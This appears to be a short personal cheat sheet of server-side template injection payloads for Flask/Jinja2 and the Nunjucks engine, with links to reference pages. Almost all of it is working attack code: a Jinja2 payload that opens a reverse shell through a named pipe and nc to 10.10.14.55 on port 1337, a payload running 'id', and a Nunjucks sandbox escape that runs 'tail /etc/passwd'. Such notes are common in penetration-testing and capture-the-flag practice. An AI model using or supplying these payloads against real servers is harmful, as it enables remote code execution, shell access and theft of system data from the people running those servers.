## flask
https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md
remote code exec
```bash
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.55 1337 >/tmp/f').read() }}
```

```bash
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

## nodejs nunjacks
### worked but need to add \ before double quotes
```bash
http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine
```

```
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
```

